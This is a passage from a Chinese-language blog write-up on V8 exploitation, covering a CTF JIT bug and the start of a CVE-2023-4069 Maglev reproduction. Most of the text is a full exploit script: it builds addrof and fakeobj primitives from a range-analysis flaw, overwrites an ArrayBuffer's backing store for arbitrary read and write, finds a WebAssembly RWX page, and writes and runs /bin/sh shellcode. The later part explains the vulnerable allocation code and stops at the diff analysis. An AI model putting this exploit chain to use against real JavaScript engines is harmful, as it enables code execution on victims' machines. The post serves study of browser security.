Number(i &amp; 0xffffffffn);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  // int64 → high 32-bit</span><br><span class="line">  i2hi(i) &#123;</span><br><span class="line">    return Number(i &gt;&gt; 32n);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  // float32 → int32</span><br><span class="line">  f32toi32(f) &#123;</span><br><span class="line">    this.f32[0] = f;</span><br><span class="line">    return this.u32[0];</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  // int32 → float32</span><br><span class="line">  i32tof32(i) &#123;</span><br><span class="line">    this.u32[0] = i;</span><br><span class="line">    return this.f32[0];</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  p(arg) &#123;</span><br><span class="line">    %DebugPrint(arg);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  debug(arg) &#123;</span><br><span class="line">    %DebugPrint(arg);</span><br><span class="line">    %SystemBreak();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  stop() &#123;</span><br><span class="line">    %SystemBreak();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">  hex32(i) &#123;</span><br><span class="line">    return i.toString(16).padStart(8, &quot;0&quot;);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  hex64(i) &#123;</span><br><span class="line">    return i.toString(16).padStart(16, &quot;0&quot;);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  hexx(str, val) &#123;</span><br><span class="line">    console.log(`[*] $&#123;str&#125;: 0x$&#123;val.toString(16)&#125;`);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  printhex(val) &#123;</span><br><span class="line">    console.log(&quot;0x&quot; + val.toString(16));</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">  add_ref(obj) &#123;</span><br><span class="line">    this.state[this.i++] = obj;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  gc() &#123;</span><br><span class="line">    new ArrayBuffer(0x7fe00000);</span><br><span class="line">    new ArrayBuffer(0x7fe00000);</span><br><span class="line">    new ArrayBuffer(0x7fe00000);</span><br><span class="line">    new ArrayBuffer(0x7fe00000);</span><br><span class="line">    new ArrayBuffer(0x7fe00000);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">const helpers = new Helpers();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">const f2i = x =&gt; helpers.f2i(x);</span><br><span class="line">const i2f = x =&gt; helpers.i2f(x);</span><br><span class="line">const hex = x =&gt; helpers.hex(x);</span><br><span class="line">const f2h = x =&gt; helpers.f2h(x);</span><br><span class="line">const f2a = x =&gt; helpers.f2a(x);</span><br><span class="line">const a2f = x =&gt; helpers.a2f(x);</span><br><span class="line">const f2is = x =&gt; helpers.f2is(x);</span><br><span class="line">const i2fs = x =&gt; helpers.i2fs(x);</span><br><span class="line">const f2lo = x =&gt; helpers.f2lo(x);</span><br><span class="line">const f2hi = x =&gt; helpers.f2hi(x);</span><br><span class="line">const i2f64 = (lo, hi) =&gt; helpers.i2f64(lo, hi);</span><br><span class="line">const i2lo = x =&gt; helpers.i2lo(x);</span><br><span class="line">const i2hi = x =&gt; helpers.i2hi(x);</span><br><span class="line">const f32toi32 = x =&gt; helpers.f32toi32(x);</span><br><span class="line">const i32tof32 = x =&gt; helpers.i32tof32(x);</span><br><span class="line">const p = x =&gt; helpers.p(x);</span><br><span class="line">const debug = x =&gt; helpers.debug(x);</span><br><span class="line">const stop = () =&gt; helpers.stop();</span><br><span class="line">const hex32 = x =&gt; helpers.hex32(x);</span><br><span class="line">const hex64 = x =&gt; helpers.hex64(x);</span><br><span class="line">const hexx = (str, val) =&gt; helpers.hexx(str, val);</span><br><span class="line">const printhex = x =&gt; helpers.printhex(x);</span><br><span class="line">const add_ref = x =&gt; helpers.add_ref(x);</span><br><span class="line">const gc = () =&gt; helpers.gc();</span><br><span class="line"></span><br><span class="line">function f(func, idx, trigger, obj, addr) &#123;</span><br><span class="line">  let double_arr = [0.0, 1.1, 2.2, 3.3, 4.4, 5.5, 6.6, 7.7, 8.8];</span><br><span class="line">  let obj_arr = [&#123;&#125;];</span><br><span class="line">  let x = trigger == 0 ? 9007199254740989 : 9007199254740992;</span><br><span class="line">  let y = x + 1 + 1;</span><br><span class="line">  let z = y - 9007199254740991; // Range(0, 1) but 3</span><br><span class="line">  z *= 6;                       // Range(0, 6) but 18</span><br><span class="line"></span><br><span class="line">  if (func == &quot;addrof&quot;) &#123;</span><br><span class="line">    obj_arr[idx] = obj;         </span><br><span class="line">    return f2a(double_arr[z]);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  if (func == &quot;fakeobj&quot;) &#123;</span><br><span class="line">    double_arr[z] = a2f(addr);</span><br><span class="line">    return obj_arr[idx];        </span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">for (let i = 0; i &lt; 0x100000; i++) &#123;</span><br><span class="line">  f(&quot;addrof&quot;, 0, 0, &#123;&#125;, 0n);</span><br><span class="line">  f(&quot;fakeobj&quot;, 0, 0, &#123;&#125;, 0n);</span><br><span class="line">&#125;</span><br><span class="line">const addrof = obj =&gt; f(&quot;addrof&quot;, 0, 1, obj, 0n);</span><br><span class="line">const fakeobj = addr =&gt; f(&quot;fakeobj&quot;, 0, 1, &#123;&#125;, addr);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>解释一下这里f的idx参数因为直接obj_arr[0]会被优化掉导致对象数组不存在(对象数组直接被优化成对象)，所以加一个idx可变得值让他不被直接优化成一个对象，但是伪造一个数组进行任意地址读写需要map，调试发现elements附近没有map，也就是刚才的方法用不了，不过目的都是任意地址读写，放一个ArrayBuffer进行调试，可以发现Float64Array有一个类似backing_store的指针存储的位置和double_arr的elements地址接近，查了一下说是backing_store的副本，可以通过越界double_arr来改backing_store指针实现一个任意地址写</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br></pre></td><td class="code"><pre><span class="line">class Helpers &#123;</span><br><span class="line">  constructor() &#123;</span><br><span class="line">    this.buf = new ArrayBuffer(8);</span><br><span class="line">    this.f64 = new Float64Array(this.buf);</span><br><span class="line">    this.f32 = new Float32Array(this.buf);</span><br><span class="line">    this.u32 = new Uint32Array(this.buf);</span><br><span class="line">    this.u64 = new BigUint64Array(this.buf);</span><br><span class="line">    this.i64 = new BigInt64Array(this.buf);</span><br><span class="line"></span><br><span class="line">    this.state = &#123;&#125;;</span><br><span class="line">    this.i = 0;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  // float64 → uint64</span><br><span class="line">  f2i(x) &#123;</span><br><span class="line">    this.f64[0] = x;</span><br><span class="line">    return this.u64[0];</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  // uint64 → float64</span><br><span class="line">  i2f(x) &#123;</span><br><span class="line">    this.u64[0] = x;</span><br><span class="line">    return this.f64[0];</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  // int to hex string</span><br><span class="line">  hex(x) &#123;</span><br><span class="line">    return &quot;0x&quot; + x.toString(16);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  // float to hex string</span><br><span class="line">  f2h(x) &#123;</span><br><span class="line">    return this.hex(this.f2i(x));</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  // float to aligned address (clear low 2 bits)</span><br><span class="line">  f2a(x) &#123;</span><br><span class="line">    return this.f2i(x) &gt;&gt; 2n &lt;&lt; 2n;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  // address to float (set low bit)</span><br><span class="line">  a2f(x) &#123;</span><br><span class="line">    return this.i2f(x | 1n);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  // float64 → int64 (signed)</span><br><span class="line">  f2is(x) &#123;</span><br><span class="line">    this.f64[0] = x;</span><br><span class="line">    return this.i64[0];</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  // int64 → float64 (signed)</span><br><span class="line">  i2fs(x) &#123;</span><br><span class="line">    this.i64[0] = x;</span><br><span class="line">    return this.f64[0];</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  // float64 → low 32-bit</span><br><span class="line">  f2lo(x) &#123;</span><br><span class="line">    this.f64[0] = x;</span><br><span class="line">    return this.u32[0];</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  // float64 → high 32-bit</span><br><span class="line">  f2hi(x) &#123;</span><br><span class="line">    this.f64[0] = x;</span><br><span class="line">    return this.u32[1];</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  // two 32-bit → float64</span><br><span class="line">  i2f64(lo, hi) &#123;</span><br><span class="line">    this.u32[0] = lo &gt;&gt;&gt; 0;</span><br><span class="line">    this.u32[1] = hi &gt;&gt;&gt; 0;</span><br><span class="line">    return this.f64[0];</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  // int64 → low 32-bit</span><br><span class="line">  i2lo(i) &#123;</span><br><span class="line">    return Number(i &amp; 0xffffffffn);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  // int64 → high 32-bit</span><br><span class="line">  i2hi(i) &#123;</span><br><span class="line">    return Number(i &gt;&gt; 32n);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  // float32 → int32</span><br><span class="line">  f32toi32(f) &#123;</span><br><span class="line">    this.f32[0] = f;</span><br><span class="line">    return this.u32[0];</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  // int32 → float32</span><br><span class="line">  i32tof32(i) &#123;</span><br><span class="line">    this.u32[0] = i;</span><br><span class="line">    return this.f32[0];</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  p(arg) &#123;</span><br><span class="line">    %DebugPrint(arg);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  debug(arg) &#123;</span><br><span class="line">    %DebugPrint(arg);</span><br><span class="line">    %SystemBreak();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  stop() &#123;</span><br><span class="line">    %SystemBreak();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">  hex32(i) &#123;</span><br><span class="line">    return i.toString(16).padStart(8, &quot;0&quot;);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  hex64(i) &#123;</span><br><span class="line">    return i.toString(16).padStart(16, &quot;0&quot;);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  hexx(str, val) &#123;</span><br><span class="line">    console.log(`[*] $&#123;str&#125;: 0x$&#123;val.toString(16)&#125;`);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  printhex(val) &#123;</span><br><span class="line">    console.log(&quot;0x&quot; + val.toString(16));</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">  add_ref(obj) &#123;</span><br><span class="line">    this.state[this.i++] = obj;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  gc() &#123;</span><br><span class="line">    new ArrayBuffer(0x7fe00000);</span><br><span class="line">    new ArrayBuffer(0x7fe00000);</span><br><span class="line">    new ArrayBuffer(0x7fe00000);</span><br><span class="line">    new ArrayBuffer(0x7fe00000);</span><br><span class="line">    new ArrayBuffer(0x7fe00000);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">const helpers = new Helpers();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">const f2i = x =&gt; helpers.f2i(x);</span><br><span class="line">const i2f = x =&gt; helpers.i2f(x);</span><br><span class="line">const hex = x =&gt; helpers.hex(x);</span><br><span class="line">const f2h = x =&gt; helpers.f2h(x);</span><br><span class="line">const f2a = x =&gt; helpers.f2a(x);</span><br><span class="line">const a2f = x =&gt; helpers.a2f(x);</span><br><span class="line">const f2is = x =&gt; helpers.f2is(x);</span><br><span class="line">const i2fs = x =&gt; helpers.i2fs(x);</span><br><span class="line">const f2lo = x =&gt; helpers.f2lo(x);</span><br><span class="line">const f2hi = x =&gt; helpers.f2hi(x);</span><br><span class="line">const i2f64 = (lo, hi) =&gt; helpers.i2f64(lo, hi);</span><br><span class="line">const i2lo = x =&gt; helpers.i2lo(x);</span><br><span class="line">const i2hi = x =&gt; helpers.i2hi(x);</span><br><span class="line">const f32toi32 = x =&gt; helpers.f32toi32(x);</span><br><span class="line">const i32tof32 = x =&gt; helpers.i32tof32(x);</span><br><span class="line">const p = x =&gt; helpers.p(x);</span><br><span class="line">const debug = x =&gt; helpers.debug(x);</span><br><span class="line">const stop = () =&gt; helpers.stop();</span><br><span class="line">const hex32 = x =&gt; helpers.hex32(x);</span><br><span class="line">const hex64 = x =&gt; helpers.hex64(x);</span><br><span class="line">const hexx = (str, val) =&gt; helpers.hexx(str, val);</span><br><span class="line">const printhex = x =&gt; helpers.printhex(x);</span><br><span class="line">const add_ref = x =&gt; helpers.add_ref(x);</span><br><span class="line">const gc = () =&gt; helpers.gc();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">function f(func, idx, trigger, obj, addr) &#123;</span><br><span class="line">  let double_arr = [0.0, 1.1, 2.2, 3.3, 4.4, 5.5, 6.6, 7.7, 8.8];</span><br><span class="line">  let obj_arr = [&#123;&#125;];</span><br><span class="line">  let x = trigger == 0 ? 9007199254740989 : 9007199254740992;</span><br><span class="line">  let y = x + 1 + 1;</span><br><span class="line">  let z = y - 9007199254740991; // Range(0, 1) but 3</span><br><span class="line">  z *= 6;                       // Range(0, 6) but 18</span><br><span class="line"></span><br><span class="line">  if (func == &quot;addrof&quot;) &#123;</span><br><span class="line">    obj_arr[idx] = obj;           </span><br><span class="line">    return f2a(double_arr[z]);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  if (func == &quot;fakeobj&quot;) &#123;</span><br><span class="line">    double_arr[z] = a2f(addr);</span><br><span class="line">    return obj_arr[idx];          </span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">for (let i = 0; i &lt; 0x10000; i++) &#123;</span><br><span class="line">  f(&quot;addrof&quot;, 0, 0, &#123;&#125;, 0n);</span><br><span class="line">  f(&quot;fakeobj&quot;, 0, 0, &#123;&#125;, 0n);</span><br><span class="line">&#125;</span><br><span class="line">const addrof = obj =&gt; f(&quot;addrof&quot;, 0, 1, obj, 0n);</span><br><span class="line">const fakeobj = addr =&gt; f(&quot;fakeobj&quot;, 0, 1, &#123;&#125;, addr);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">let arrbuf = new ArrayBuffer(0x100);</span><br><span class="line"></span><br><span class="line">function r(idx, trigger, addr) &#123;</span><br><span class="line">  let double_arr = [0.0, 1.1, 2.2, 3.3, 4.4, 5.5, 6.6, 7.7, 8.8];</span><br><span class="line">  let another_arr = new Float64Array(arrbuf);</span><br><span class="line">  let x = trigger == 0 ? 9007199254740989 : 9007199254740992;</span><br><span class="line">  let y = x + 1 + 1;</span><br><span class="line">  let z = y - 9007199254740991; // Range(0, 1) but 3</span><br><span class="line">  z *= 7;                       // Range(0, 6) but 21</span><br><span class="line">  trigger = another_arr[idx];   </span><br><span class="line">  double_arr[z] = i2f(addr);</span><br><span class="line">  return another_arr;</span><br><span class="line">&#125;</span><br><span class="line">for (let i = 0; i &lt; 0x10000; i++)</span><br><span class="line">  r(0, 0, 0n);</span><br><span class="line">let replace_bks = addr =&gt; r(0, 1, addr);</span><br><span class="line"></span><br><span class="line">let wasm_code = new Uint8Array([</span><br><span class="line">  0, 97, 115, 109, 1, 0, 0, 0, 1, 133, 128, 128, 128, 0, 1, 96, 0, 1, 127, 3, 130, 128, 128, 128, 0,</span><br><span class="line">  1, 0, 4, 132, 128, 128, 128, 0, 1, 112, 0, 0, 5, 131, 128, 128, 128, 0, 1, 0, 1, 6, 129, 128, 128,</span><br><span class="line">  128, 0, 0, 7, 145, 128, 128, 128, 0, 2, 6, 109, 101, 109, 111, 114, 121, 2, 0, 4, 109, 97, 105,</span><br><span class="line">  110, 0, 0, 10, 142, 128, 128, 128, 0, 1, 136, 128, 128, 128, 0, 0, 65, 239, 253, 182, 245, 125,</span><br><span class="line">  11,</span><br><span class="line">]);</span><br><span class="line">let wasm_module = new WebAssembly.Module(wasm_code);</span><br><span class="line">let wasm_instance = new WebAssembly.Instance(wasm_module);</span><br><span class="line">let shell = wasm_instance.exports.main</span><br><span class="line">let data = replace_bks(addrof(wasm_instance));</span><br><span class="line">let rwx_addr = f2a(data[0x1d]);</span><br><span class="line">data = replace_bks(rwx_addr);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">print(&quot;rwx_addr: &quot;, hex(rwx_addr));</span><br><span class="line"></span><br><span class="line">let shellcode = new BigInt64Array([</span><br><span class="line">    0x2fbb485299583b6an,</span><br><span class="line">    0x5368732f6e69622fn,</span><br><span class="line">    0x050f5e5457525f54n</span><br><span class="line">]);</span><br><span class="line">for (let i = 0; i &lt; shellcode.length; i++)</span><br><span class="line">  data[i] = i2f(shellcode[i]);</span><br><span class="line">shell()</span><br></pre></td></tr></table></figure>

<p>参考</p>
<p><a target="_blank" rel="noopener" href="https://blog.wingszeng.top/2018-google-ctf-just-in-time/">https://blog.wingszeng.top/2018-google-ctf-just-in-time/</a></p>
<p><a target="_blank" rel="noopener" href="https://kiprey.github.io/2021/01/v8-turboFan/">https://kiprey.github.io/2021/01/v8-turboFan/</a></p>
<h3 id="CVE-2023-4069复现"><a href="#CVE-2023-4069复现" class="headerlink" title="CVE-2023-4069复现"></a>CVE-2023-4069复现</h3><p>CVE-2023-4069是关于Maglev图建阶段的一个漏洞 刚好可以用来学习V8中的maglev</p>
<h4 id="环境搭建-1"><a href="#环境搭建-1" class="headerlink" title="环境搭建"></a>环境搭建</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git checkout 5315f073233429c5f5c2c794594499debda307bd</span><br><span class="line">gclient sync -D</span><br><span class="line">python3 tools\dev\gm.py x64.release</span><br></pre></td></tr></table></figure>

<h4 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h4><p>漏洞主要在Maglev 分配对象中快速路径的部分</p>
<p>下面是分配对象的一个函数示例</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Reflect.construct(target, argumentsList[, newTarget])</span><br><span class="line">target可以理解为当前要分配的类，argumentsList是类数组，newTarget指的是原型类</span><br></pre></td></tr></table></figure>

<h5 id="快速路径的分配流程"><a href="#快速路径的分配流程" class="headerlink" title="快速路径的分配流程"></a>快速路径的分配流程</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">TNode&lt;JSObject&gt; ConstructorBuiltinsAssembler::FastNewObject(</span><br><span class="line">    TNode&lt;Context&gt; context, TNode&lt;JSFunction&gt; target,</span><br><span class="line">    TNode&lt;JSReceiver&gt; new_target, Label* call_runtime) &#123;</span><br><span class="line">  // Verify that the new target is a JSFunction.</span><br><span class="line">  Label end(this);</span><br><span class="line">  TNode&lt;JSFunction&gt; new_target_func =</span><br><span class="line">      HeapObjectToJSFunctionWithPrototypeSlot(new_target, call_runtime);</span><br><span class="line">  // Fast path.</span><br><span class="line"> </span><br><span class="line">  // Load the initial map and verify that it&#x27;s in fact a map.</span><br><span class="line">  TNode&lt;Object&gt; initial_map_or_proto =</span><br><span class="line">      LoadJSFunctionPrototypeOrInitialMap(new_target_func);</span><br><span class="line">  GotoIf(TaggedIsSmi(initial_map_or_proto), call_runtime);</span><br><span class="line">  GotoIf(DoesntHaveInstanceType(CAST(initial_map_or_proto), MAP_TYPE),</span><br><span class="line">         call_runtime);</span><br><span class="line">  TNode&lt;Map&gt; initial_map = CAST(initial_map_or_proto);</span><br><span class="line"> </span><br><span class="line">  // Fall back to runtime if the target differs from the new target&#x27;s</span><br><span class="line">  // initial map constructor.</span><br><span class="line">  TNode&lt;Object&gt; new_target_constructor = LoadObjectField(</span><br><span class="line">      initial_map, Map::kConstructorOrBackPointerOrNativeContextOffset);</span><br><span class="line">  GotoIf(TaggedNotEqual(target, new_target_constructor), call_runtime);</span><br><span class="line"> </span><br><span class="line">  TVARIABLE(HeapObject, properties);</span><br><span class="line"> </span><br><span class="line">  Label instantiate_map(this), allocate_properties(this);</span><br><span class="line">  GotoIf(IsDictionaryMap(initial_map), &amp;allocate_properties);</span><br><span class="line">  &#123;</span><br><span class="line">    properties = EmptyFixedArrayConstant();</span><br><span class="line">    Goto(&amp;instantiate_map);</span><br><span class="line">  &#125;</span><br><span class="line">  BIND(&amp;allocate_properties);</span><br><span class="line">  &#123;</span><br><span class="line">    if (V8_ENABLE_SWISS_NAME_DICTIONARY_BOOL) &#123;</span><br><span class="line">      properties =</span><br><span class="line">          AllocateSwissNameDictionary(SwissNameDictionary::kInitialCapacity);</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">      properties = AllocateNameDictionary(NameDictionary::kInitialCapacity);</span><br><span class="line">    &#125;</span><br><span class="line">    Goto(&amp;instantiate_map);</span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">  BIND(&amp;instantiate_map);</span><br><span class="line">  return AllocateJSObjectFromMap(initial_map, properties.value(), base::nullopt,</span><br><span class="line">                                 AllocationFlag::kNone, kWithSlackTracking);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>条件就是</p>
<ul>
<li>new_target的类型是JSFunction</li>
<li>new_target_func的initial map是否是smi类型，smi指的是低位不是1的地址，因为map在v8中是对象指针，所以低位肯定是1</li>
<li>target和new_target_constructor相同</li>
<li>map的类型为DictionaryMap</li>
</ul>
<p>否则会进入到慢速分配中</p>
<h5 id="diff分析"><a href="#diff分析" class="headerlink" title="diff分析"></a>diff分析</h5><p>下面分析一下这个CVE的diff文件，这个diff是修复代码不是以前的制造漏洞的diff，不会真的有人做题时把它patch到v8编译吧</p>
